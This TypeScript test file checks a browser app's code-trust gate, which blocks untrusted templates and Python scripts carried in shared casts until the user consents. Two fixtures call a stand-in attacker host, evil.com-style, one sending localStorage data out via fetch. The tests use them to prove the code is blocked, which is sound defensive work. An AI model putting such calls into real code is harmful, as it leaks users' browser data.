// Code that travels inside a cast runs only when this browser trusts its exact
// bytes (security review 2026-09-28, src/security/code-trust.ts). These pin
// the trust decision and every sink that enforces it: cast-carried templates,
// the resolve pass for code elements, the sweep runner, and the consent flow.
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import {
  codeItemsOf,
  codeKey,
  gateItem,
  gateSpecs,
  isDeclined,
  isTrusted,
  migrateOnce,
  onBlocked,
  resetCodeTrust,
  setConsentHandler,
  templateKey,
  trustDerived,
  trustKeys,
  trustSpecs,
  untrustedItems,
} from "../src/security/code-trust";
import { sha256Hex } from "../src/security/sha256";
import { isBlockedCastTemplate, isCastTemplateId, registerCastTemplates, resetCastTemplates } from "../src/scenes/cast-templates";
import { registerUserTemplateYaml, unregisterUserTemplate } from "../src/scenes/my-templates";
import { scenes } from "../src/scenes/registry";
import { layoutSpec } from "../src/layout/layout";
import { NOT_RUN_MESSAGE, resolveCode } from "../src/render/code";
import { sweepRunnerFor } from "../src/render/sweep-run";
import { describeItems } from "../src/ui/code-consent";
import type { TemplateDoc } from "../src/scenes/doc";
import type { Spec } from "../src/spec/types";
import type { CodeRunResult } from "../src/code/run";

function doc(id: string, extra: Partial<TemplateDoc> = {}): TemplateDoc {
  return {
    template: id, title: "Trust test", version: 1, kit: 1, status: "ready",
    description: "A cast-carried test figure. Choose this for trust tests.",
    params: { type: "object", properties: {} }, element_ids: { ring: "the ring" },
    examples: [{ request: "Draw the trust ring.", params: {} }],
    layout: `globalThis.__castTemplateRan = (globalThis.__castTemplateRan ?? 0) + 1; return { drawables: [kit.stroke("ring", kit.polygon([500, 400], 120, 6), { closed: true })], labels: [], anchors: {}, order: ["ring"] };`,
    ...extra,
  };
}

const OK: CodeRunResult = { ok: true, stdout: "ran\n", stderr: "", figures: [] };
const codeEl = (code: string, extra: Record<string, unknown> = {}) => ({ id: "c1", type: "code", language: "python", code, ...extra });
const noCache = { cacheGet: async () => null, cachePut: async () => undefined };

const added: string[] = [];
beforeEach(() => {
  resetCodeTrust("check");
  delete (globalThis as { __castTemplateRan?: number }).__castTemplateRan;
});
afterEach(() => {
  for (const id of added.splice(0)) delete scenes[id];
  resetCastTemplates();
  resetCodeTrust(); // back to the node default ("all") for every other suite
});

describe("sha256", () => {
  test("matches the FIPS 180-4 vectors", () => {
    expect(sha256Hex("")).toBe("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
    expect(sha256Hex("abc")).toBe("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
    expect(sha256Hex("abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq")).toBe("248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1");
    // multi-byte UTF-8 is hashed as its bytes
    expect(sha256Hex("æøå")).toHaveLength(64);
  });
});

describe("what counts as code", () => {
  test("template bodies and page-reaching scripts are items; BASIC and bodiless docs are not", () => {
    const spec = {
      templates: [doc("t_a"), { template: "t_stub", status: "stub" }],
      elements: [codeEl("print(1)"), { id: "b", type: "code", language: "basic", code: "10 PRINT 1" }, { id: "t", type: "text", text: "hi" }],
    };
    const items = codeItemsOf(spec);
    expect(items.map((i) => i.kind).sort()).toEqual(["code", "template"]);
    expect(items.find((i) => i.kind === "code")?.language).toBe("python");
  });

  test("code and a differing code_src are both keyed (the tray and sweep run code_src)", () => {
    const items = codeItemsOf({ elements: [codeEl("x = 1", { code_src: "import js" })] });
    expect(items).toHaveLength(2);
  });

  test("a template's key is its body, not its id", () => {
    expect(templateKey(doc("a"))).toBe(templateKey(doc("b")));
    expect(templateKey(doc("a"))).not.toBe(templateKey(doc("a", { layout: "return 1;" })));
  });

  test("tolerates junk", () => {
    expect(codeItemsOf(null)).toEqual([]);
    expect(codeItemsOf({ templates: "x", elements: [null, 3] } as never)).toEqual([]);
  });
});

describe("cast-carried templates", () => {
  test("an untrusted template is neither compiled nor registered, and the cast lays out freehand", () => {
    const seen: string[] = [];
    onBlocked((i) => seen.push(i.name));
    const r = registerCastTemplates({ templates: [doc("cast_evil")] });
    expect(r.blocked).toEqual(["cast_evil"]);
    expect(r.registered).toEqual([]);
    expect(scenes.cast_evil).toBeUndefined();
    expect(isCastTemplateId("cast_evil")).toBe(false);
    expect(isBlockedCastTemplate("cast_evil")).toBe(true);
    expect(seen).toEqual(["cast_evil"]);
    const out = layoutSpec({ template: "cast_evil", params: {}, elements: [] } as never);
    expect((globalThis as { __castTemplateRan?: number }).__castTemplateRan).toBeUndefined();
    expect(out.warnings.join(" ")).toMatch(/cast_evil/);
  });

  test("with consent it registers and runs", async () => {
    added.push("cast_ok");
    const spec = { templates: [doc("cast_ok")] };
    setConsentHandler(async () => true);
    expect(await gateSpecs([spec])).toBe(true);
    const r = registerCastTemplates(spec);
    expect(r.registered).toEqual(["cast_ok"]);
    layoutSpec({ template: "cast_ok", params: {}, elements: [] } as never);
    expect((globalThis as { __castTemplateRan?: number }).__castTemplateRan).toBe(1);
  });

  test("a changed body is a different program and asks again", async () => {
    setConsentHandler(async () => true);
    await gateSpecs([{ templates: [doc("cast_v")] }]);
    const handler = vi.fn(async () => false);
    setConsentHandler(handler);
    const v2 = { templates: [doc("cast_v", { layout: `fetch("https://evil.example/?" + localStorage.length); return null;` })] };
    expect(await gateSpecs([v2])).toBe(false);
    expect(handler).toHaveBeenCalledTimes(1);
    expect(registerCastTemplates(v2).blocked).toEqual(["cast_v"]);
  });

  test("your own My templates are trusted wherever a cast carries them", () => {
    const d = doc("my_trusted_tpl");
    const yaml = JSON.stringify(d); // YAML is a superset of JSON
    const r = registerUserTemplateYaml(yaml);
    expect(r.ok).toBe(true);
    expect(isTrusted(templateKey(d))).toBe(true);
    unregisterUserTemplate("my_trusted_tpl");
    // A viewer page without the My templates registry: the cast copy registers.
    added.push("my_trusted_tpl");
    expect(registerCastTemplates({ templates: [d] }).registered).toEqual(["my_trusted_tpl"]);
  });

  test("policy 'all' (node, the engine, the dev harness) registers without asking", () => {
    resetCodeTrust("all");
    added.push("cast_dev");
    expect(registerCastTemplates({ templates: [doc("cast_dev")] }).registered).toEqual(["cast_dev"]);
  });
});

describe("code elements", () => {
  test("an untrusted script never runs; its baked output stands", async () => {
    const runner = vi.fn(async () => OK);
    const baked = JSON.stringify({ ok: true, stdout: "the author's output\n", stderr: "", figures: [] });
    // A baked stamp that does not cover a requested path would normally be re-run.
    const spec = { elements: [codeEl("import js\njs.fetch('https://evil.example')", { code_result: baked })], params: { v: "{c1.y}" } } as unknown as Spec;
    const res = await resolveCode(spec, { runner, ...noCache });
    expect(runner).not.toHaveBeenCalled();
    expect(res[0]).toMatchObject({ id: "c1", blocked: true });
    // the author's run stands (the unanswered token is recorded on it, as for any stamp)
    expect(JSON.parse(spec.elements![0].code_result as string)).toMatchObject({ ok: true, stdout: "the author's output\n" });
  });

  test("with no baked output it says why instead of running", async () => {
    const runner = vi.fn(async () => OK);
    const spec = { elements: [codeEl("print(1)")] } as unknown as Spec;
    await resolveCode(spec, { runner, ...noCache });
    expect(runner).not.toHaveBeenCalled();
    expect(JSON.parse(spec.elements![0].code_result as string)).toMatchObject({ ok: false, error: NOT_RUN_MESSAGE });
  });

  test("a trusted script runs; BASIC never needs trust", async () => {
    const runner = vi.fn(async () => OK);
    const spec = { elements: [codeEl("print(1)"), { id: "b1", type: "code", language: "basic", code: '10 PRINT "HI"' }] } as unknown as Spec;
    trustSpecs([{ elements: [codeEl("print(1)")] }]);
    await resolveCode(spec, { runner, ...noCache });
    expect(runner).toHaveBeenCalledTimes(2);
  });

  test("the sweep runner refuses an untrusted script", async () => {
    const runner = vi.fn(async () => OK);
    const authored = { elements: [codeEl("n = (3, 1, 9)\nprint(n)", { controls: ["n"] })] } as unknown as Spec;
    await expect(sweepRunnerFor(authored, { runner, ...noCache })("c1", { n: 4 })).rejects.toThrow(/not run/);
    expect(runner).not.toHaveBeenCalled();
    trustSpecs([authored]);
    await sweepRunnerFor(authored, { runner, ...noCache })("c1", { n: 4 });
    expect(runner).toHaveBeenCalledTimes(1);
  });
});

describe("asking", () => {
  const spec = { elements: [codeEl("print('hello')")] };

  test("no handler installed fails closed", async () => {
    expect(await gateSpecs([spec])).toBe(false);
    expect(untrustedItems([spec])).toHaveLength(1);
  });

  test("Run it trusts the bytes persistently; nothing is asked twice", async () => {
    const handler = vi.fn(async () => true);
    setConsentHandler(handler);
    expect(await gateSpecs([spec])).toBe(true);
    expect(await gateSpecs([spec])).toBe(true);
    expect(handler).toHaveBeenCalledTimes(1);
    expect(untrustedItems([spec])).toEqual([]);
  });

  test("Show without it is remembered for the session; askAgain re-asks", async () => {
    const handler = vi.fn(async () => false);
    setConsentHandler(handler);
    expect(await gateSpecs([spec])).toBe(false);
    expect(await gateSpecs([spec])).toBe(false);
    expect(handler).toHaveBeenCalledTimes(1);
    expect(isDeclined(codeItemsOf(spec)[0].key)).toBe(true);
    handler.mockResolvedValueOnce(true);
    expect(await gateSpecs([spec], { askAgain: true })).toBe(true);
    expect(isDeclined(codeItemsOf(spec)[0].key)).toBe(false);
  });

  test("a tray Run asks for the one script even after a decline", async () => {
    const handler = vi.fn(async () => false);
    setConsentHandler(handler);
    await gateSpecs([spec]);
    handler.mockResolvedValueOnce(true);
    const item = codeItemsOf(spec)[0];
    expect(await gateItem(item)).toBe(true);
    expect(handler).toHaveBeenCalledTimes(2);
  });

  test("concurrent gates never stack two prompts", async () => {
    let calls = 0;
    setConsentHandler(async () => {
      calls++;
      await new Promise((r) => setTimeout(r, 5));
      return true;
    });
    const [a, b] = await Promise.all([gateSpecs([spec]), gateSpecs([spec])]);
    expect([a, b]).toEqual([true, true]);
    expect(calls).toBe(1);
  });

  test("the prompt names what the cast carries", () => {
    expect(describeItems(codeItemsOf({ templates: [doc("x")], elements: [codeEl("1"), { id: "r", type: "code", language: "r", code: "1" }] }))).toBe("a custom template and 2 Python and R scripts");
  });
});

describe("what is yours", () => {
  test("an edit of trusted code stays trusted; an edit of someone else's does not; new code is yours", () => {
    const mine = { elements: [codeEl("print('mine')")] };
    const theirs = { elements: [{ ...codeEl("print('theirs')"), id: "c2" }] };
    trustSpecs([mine]);
    trustDerived(
      [mine, theirs],
      [
        { elements: [codeEl("print('mine, edited')")] },
        { elements: [{ ...codeEl("print('theirs, edited')"), id: "c2" }] },
        { elements: [{ ...codeEl("print('brand new')"), id: "c3" }] },
      ],
    );
    expect(isTrusted(codeKey("python", "print('mine, edited')"))).toBe(true);
    expect(isTrusted(codeKey("python", "print('theirs, edited')"))).toBe(false);
    expect(isTrusted(codeKey("python", "print('brand new')"))).toBe(true);
  });

  test("bundled content can be trusted for the page only", () => {
    trustKeys(["c:bundled"], { persist: false });
    expect(isTrusted("c:bundled")).toBe(true);
  });

  test("migrateOnce trusts the existing library exactly once", () => {
    // node has no localStorage: the migration is a no-op there (fail closed).
    migrateOnce(() => [{ elements: [codeEl("print('old')")] }]);
    expect(isTrusted(codeKey("python", "print('old')"))).toBe(false);
    const store = new Map<string, string>();
    vi.stubGlobal("localStorage", {
      getItem: (k: string) => store.get(k) ?? null,
      setItem: (k: string, v: string) => void store.set(k, v),
      removeItem: (k: string) => void store.delete(k),
    });
    try {
      resetCodeTrust("check");
      migrateOnce(() => [{ elements: [codeEl("print('old')")] }]);
      expect(isTrusted(codeKey("python", "print('old')"))).toBe(true);
      migrateOnce(() => [{ elements: [codeEl("print('later')")] }]);
      expect(isTrusted(codeKey("python", "print('later')"))).toBe(false);
    } finally {
      vi.unstubAllGlobals();
    }
  });
});
